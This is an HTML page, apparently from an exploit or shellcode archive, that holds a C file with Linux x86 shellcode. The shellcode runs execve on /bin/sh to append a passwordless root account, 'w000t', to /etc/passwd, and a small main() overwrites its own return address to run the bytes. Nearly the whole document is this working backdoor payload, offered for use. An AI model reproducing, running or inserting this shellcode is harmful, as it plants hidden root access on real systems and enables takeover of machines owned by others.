<html><head><title>Linux/x86 - add a passwordless local root account w000t - 177 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>


Linux x86 shellcode that uses execve and echo &gt;&gt; to create a passwordless
root account.


Author: zillion
Email : zillion@safemode.org
Homepage: safemode.org
File: w000t-shell.c



/*
 * This shellcode will add a passwordless local root account 'w000t'
 * Written by zillion@safemode.org
 *
 * Why so big ? it uses execve ;-)
 */

char shellcode[]=
        &quot;\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0a\x88\x46\x47\x89&quot;
        &quot;\x76\x49\x8d\x5e\x08\x89\x5e\x4d\x8d\x5e\x0b\x89\x5e\x51\x89&quot;
        &quot;\x46\x55\xb0\x0b\x89\xf3\x8d\x4e\x49\x8d\x56\x55\xcd\x80\xe8&quot;
        &quot;\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x2d\x63\x23&quot;
        &quot;\x2f\x62\x69\x6e\x2f\x65\x63\x68\x6f\x20\x77\x30\x30\x30\x74&quot;
        &quot;\x3a\x3a\x30\x3a\x30\x3a\x73\x34\x66\x65\x6d\x30\x64\x65\x3a&quot;
        &quot;\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68&quot;
        &quot;\x20\x3e\x3e\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;
        &quot;\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44&quot;
        &quot;\x44\x44&quot;;



int main()
{

  int *ret;
  ret = (int *)&amp;ret + 2;
  (*ret) = (int)shellcode;
}


-- 



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
